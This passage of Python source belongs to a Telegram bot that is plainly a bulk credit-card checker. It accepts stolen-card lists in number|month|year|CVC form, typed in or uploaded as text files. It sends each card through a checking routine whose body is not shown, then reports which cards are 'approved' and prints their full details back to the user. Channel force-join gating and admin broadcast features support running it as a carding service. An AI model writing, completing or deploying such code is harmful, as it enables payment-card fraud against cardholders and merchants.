    keyboard = [[make_btn(f"{e(E_BACK, '🔙')} Back to Menu", callback_data="back_to_menu", style="danger", icon_custom_emoji_id=E_BACK)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(help_text, parse_mode='HTML', reply_markup=reply_markup)

async def show_help_callback(query, context):
    help_text = (
        f"{e(E_HELP, '❓')} <b>━━━━━━ HELP SYSTEM ━━━━━━</b> {e(E_HELP, '❓')}\n\n"
        f"🤖 <b>Bot Commands:</b>\n"
        f"• <code>/start</code> - Show menu dashboard\n"
        f"• <code>/chk</code> - Initiate Card checker\n"
        f"• <code>/stats</code> - Show stats analytics\n"
        f"• <code>/reset</code> - Clear session statistics\n\n"
        f"📝 <b>Format Protocol:</b>\n"
        f"<code>5121078835045021|12|2041|111</code>\n"
        f"<i>(CardNumber|Month|Year|CVC)</i>\n\n"
        f"📂 <b>Data Lists:</b>\n"
        f"Simply upload your plaintext .txt list file with cards formatted line-by-line."
    )
    
    keyboard = [[make_btn(f"{e(E_BACK, '🔙')} Back to Menu", callback_data="back_to_menu", style="danger", icon_custom_emoji_id=E_BACK)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(help_text, parse_mode='HTML', reply_markup=reply_markup)

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_force_joined(user_id, context):
        await send_force_join_message(update, context, user_id)
        return
        
    keyboard = [
        [
            make_btn(f"{e(E_APPROVED, '✅')} Enter Cards", callback_data="check_cc", style="success", icon_custom_emoji_id=E_APPROVED),
            make_btn(f"{e(E_FILE, '📁')} Upload File", callback_data="check_file", style="primary", icon_custom_emoji_id=E_FILE)
        ],
        [
            make_btn(f"{e(E_BACK, '🔙')} Back Menu", callback_data="back_to_menu", style="danger", icon_custom_emoji_id=E_BACK)
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🔍 <b>Initiating Checker Engine</b>\n\n"
        f"Select input mechanism to load card files:\n\n"
        f"📝 <b>Option 1:</b> Enter manual text strings\n"
        f"📁 <b>Option 2:</b> Load batch card file (.txt)\n\n"
        f"<i>Format Requirement:</i>\n"
        f"<code>5121078835045021|12|2041|111</code>",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

# ================= MESSAGE PARSING =================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    user_id = update.effective_user.id
    register_user(user_id)
    
    # Cancel handling
    if update.message.text and update.message.text.lower() == '/cancel':
        context.user_data.clear()
        await update.message.reply_text(
            f"{e(E_ERROR, '🚫')} <b>Checker operation cancelled.</b>\n"
            f"Use /start to go back.",
            parse_mode='HTML'
        )
        return
    
    # Administrative control board activation
    db = load_db()
    if update.message.text and update.message.text.startswith('/admin'):
        if user_id in db.get("admins", []):
            await admin_panel(update, context)
        else:
            await update.message.reply_text(f"{e(E_ERROR, '🚫')} Access Denied.")
        return
        
    # Block standard interface flow if Force Join validation fails
    if not await is_force_joined(user_id, context):
        await send_force_join_message(update, context, user_id)
        return

    # Process setting up dynamic force join channels
    if context.user_data.get('waiting_for_channel_username'):
        text = update.message.text.strip()
        # Admin verify check
        try:
            member = await context.bot.get_chat_member(chat_id=text, user_id=context.bot.id)
            if member.status not in ["administrator", "creator"]:
                await update.message.reply_text(
                    f"{e(E_ALERT, '⚠️')} <b>Error:</b> Bot is not promoted to admin inside <code>{text}</code>.",
                    parse_mode="HTML"
                )
                return
        except Exception as e:
            await update.message.reply_text(
                f"{e(E_ERROR, '🚫')} <b>Channel Access Failed!</b>\n"
                f"Ensure the bot is added to the channel as an Admin.",
                parse_mode="HTML"
            )
            return

        db = load_db()
        if text not in db.get("channels", []):
            db.setdefault("channels", []).append(text)
            save_db(db)
            context.user_data.clear()
            await update.message.reply_text(
                f"{e(E_APPROVED, '✅')} <b>Success!</b> Channel <code>{text}</code> successfully registered.",
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text(f"{e(E_ALERT, '⚠️')} Channel already defined.")
        return

    # Broadcast system messaging handler
    if context.user_data.get('waiting_for_broadcast_msg'):
        context.user_data.clear()
        asyncio.create_task(run_broadcast_task(update.effective_user.id, update.message, context))
        await update.message.reply_text(f"{e(E_APPROVED, '✅')} <b>Broadcast execution running...</b>", parse_mode="HTML")
        return
    
    # Process inputs manual text cards
    if context.user_data.get('waiting_for_cc'):
        text = update.message.text.strip()
        lines = text.split('\n')
        valid_cards = []
        
        for line in lines:
            if line.strip():
                if '|' in line and len(line.split('|')) == 4:
                    valid_cards.append(line.strip())
                else:
                    await update.message.reply_text(
                        f"{e(E_ERROR, '🚫')} <b>Invalid format entry:</b> <code>{html.escape(line)}</code>\n"
                        f"Format required: <code>5121078835045021|12|2041|111</code>",
                        parse_mode='HTML'
                    )
                    return
        
        if valid_cards:
            context.user_data['waiting_for_cc'] = False
            await process_cards(update, context, valid_cards)
        else:
            await update.message.reply_text(
                f"{e(E_ERROR, '🚫')} <b>No parseable credit cards found.</b>",
                parse_mode='HTML'
            )
        return
    
    # Process files
    if context.user_data.get('waiting_for_file'):
        if update.message.document:
            file = await update.message.document.get_file()
            file_content = await file.download_as_bytearray()
            text = file_content.decode('utf-8')
            lines = text.split('\n')
            valid_cards = []
            
            for line in lines:
                if line.strip():
                    if '|' in line and len(line.split('|')) == 4:
                        valid_cards.append(line.strip())
            
            if valid_cards:
                context.user_data['waiting_for_file'] = False
                await process_cards(update, context, valid_cards)
            else:
                await update.message.reply_text(
                    f"{e(E_ERROR, '🚫')} <b>No parseable credit cards inside the loaded text file.</b>",
                    parse_mode='HTML'
                )
        else:
            await update.message.reply_text(
                f"{e(E_ERROR, '🚫')} <b>Please upload a valid .txt file.</b>",
                parse_mode='HTML'
            )
        return
    
    if update.message.text and update.message.text.startswith('/chk'):
        await start_check(update, context)
        return
    
    if update.message.text and not update.message.text.startswith('/'):
        await update.message.reply_text(
            f"{e(E_HELP, '❓')} <b>Command syntax unidentified</b>\n\n"
            f"Use /start to show configuration dashboard.",
            parse_mode='HTML'
        )

# ================= CHECK ENGINE PROCESSOR =================
async def process_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, cards):
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    processing_cards = cards
    processing_status = {}
    current_chat_id = update.effective_chat.id
    
    progress_text = (
        f"{e(E_RESET, '🔄')} <b>Processing Cards Batch</b>\n\n"
        f"▱▱▱▱▱▱▱▱▱▱ 0%\n\n"
        f"📊 <b>Total Cards:</b> <code>{len(cards)}</code>\n"
        f"{e(E_APPROVED, '✅')} <b>Approved:</b> <code>0</code>\n"
        f"{e(E_DECLINED, '❌')} <b>Declined:</b> <code>0</code>\n"
        f"{e(E_ALERT, '⚠️')} <b>Unknown:</b> <code>0</code>\n"
        f"{e(E_ERROR, '🚫')} <b>Errors:</b> <code>0</code>\n\n"
        f"⏳ <i>Analyzing validation queues...</i>"
    )
    
    msg = await update.message.reply_text(progress_text, parse_mode='HTML')
    current_message_id = msg.message_id
    
    async with aiohttp.ClientSession() as session:
        for i, card in enumerate(cards, 1):
            result = await check_cc(card, session)
            processing_status[card] = result
            
            stats['total'] += 1
            if 'APPROVED' in result:
                stats['approved'] += 1
            elif 'DECLINED' in result:
                stats['declined'] += 1
            elif 'ERROR' in result or 'HTTP' in result:
                stats['errors'] += 1
            else:
                stats['unknown'] += 1
            
            # Progress calculation
            progress = int((i / len(cards)) * 10)
            bar = "▰" * progress + "▱" * (10 - progress)
            percentage = int((i / len(cards)) * 100)
            
            progress_text = (
                f"{e(E_RESET, '🔄')} <b>Processing Cards Batch</b>\n\n"
                f"{bar} {percentage}%\n\n"
                f"📊 <b>Total Cards:</b> <code>{len(cards)}</code>\n"
                f"{e(E_APPROVED, '✅')} <b>Approved:</b> <code>{stats['approved']}</code>\n"
                f"{e(E_DECLINED, '❌')} <b>Declined:</b> <code>{stats['declined']}</code>\n"
                f"{e(E_ALERT, '⚠️')} <b>Unknown:</b> <code>{stats['unknown']}</code>\n"
                f"{e(E_ERROR, '🚫')} <b>Errors:</b> <code>{stats['errors']}</code>\n\n"
                f"⏳ <i>Checking: <code>{i}/{len(cards)}</code></i>"
            )
            
            try:
                await context.bot.edit_message_text(
                    progress_text,
                    chat_id=current_chat_id,
                    message_id=current_message_id,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error updating progressive report: {e}")
            
            await asyncio.sleep(0.1)
    
    await show_results(update, context)

async def show_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    approved, declined, unknown, errors = [], [], [], []
    
    for card, result in processing_status.items():
        if 'APPROVED' in result:
            approved.append((card, result))
        elif 'DECLINED' in result:
            declined.append((card, result))
        elif 'ERROR' in result or 'HTTP' in result:
            errors.append((card, result))
        else:
            unknown.append((card, result))
    
    results_text = (
        f"{e(E_APPROVED, '✅')} <b>━━━━━━ CHECK METRICS ━━━━━━</b> {e(E_APPROVED, '✅')}\n\n"
        f"📊 <b>Total:</b> <code>{len(processing_cards)}</code>\n"
        f"{e(E_APPROVED, '✅')} <b>Approved:</b> <code>{len(approved)}</code>\n"
        f"{e(E_DECLINED, '❌')} <b>Declined:</b> <code>{len(declined)}</code>\n"
        f"{e(E_ALERT, '⚠️')} <b>Unknown:</b> <code>{len(unknown)}</code>\n"
        f"{e(E_ERROR, '🚫')} <b>Errors:</b> <code>{len(errors)}</code>\n\n"
    )
    
    if approved:
        results_text += f"{e(E_APPROVED, '✅')} <b>APPROVED PROFILE LIST:</b>\n"
        for card, result in approved[:10]:
            results_text += f"• <code>{html.escape(card)}</code> - {html.escape(result)}\n"
        if len(approved) > 10:
            results_text += f"<i>...and {len(approved)-10} more</i>\n"
        results_text += "\n"
    
    if declined:
        results_text += f"{e(E_DECLINED, '❌')} <b>DECLINED PROFILE LIST:</b>\n"
        for card, result in declined[:5]:
            results_text += f"• <code>{html.escape(card)}</code> - {html.escape(result)}\n"
        if len(declined) > 5:
            results_text += f"<i>...and {len(declined)-5} more</i>\n"
        results_text += "\n"
    
    keyboard = [
        [
            make_btn(f"{e(E_APPROVED, '✅')} Validate More", callback_data="check_cc", style="success", icon_custom_emoji_id=E_APPROVED),
            make_btn(f"{e(E_STATS, '📊')} Session Stats", callback_data="stats", style="primary", icon_custom_emoji_id=E_STATS)
        ],
        [
            make_btn(f"{e(E_BACK, '🔙')} Back Dashboard", callback_data="back_to_menu", style="danger", icon_custom_emoji_id=E_BACK)
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        await context.bot.edit_message_text(
            results_text,
            chat_id=current_chat_id,
            message_id=current_message_id,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error finalizing UI state: {e}")
        await context.bot.send_message(
            chat_id=current_chat_id,
            text=results_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    # Cleanup state variables
    processing_cards, processing_status, current_message_id, current_chat_id = [], {}, None, None

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text(
        f"{e(E_ERROR, '🚫')} <b>Checker operational state aborted.</b>\n"
        f"Enter /start to restore interface.",
        parse_mode='HTML'
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.warning(f"Update {update} raised exception {context.error}")

# ================= APP ENTRYPOINT =================
def main():
    """Bot startup configurations."""
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Registration command routing
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", start_check))
    application.add_handler(CommandHandler("stats", show_stats))
    application.add_handler(CommandHandler("reset", reset_stats))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("help", show_help))
    application.add_handler(CommandHandler("admin", admin_panel))
    
    # Configuration engines
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(
        filters.TEXT | filters.Document.ALL, 
        handle_message
    ))
    
    application.add_error_handler(error_handler)
    
    print("🤖 Checker Bot initialized successfully!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()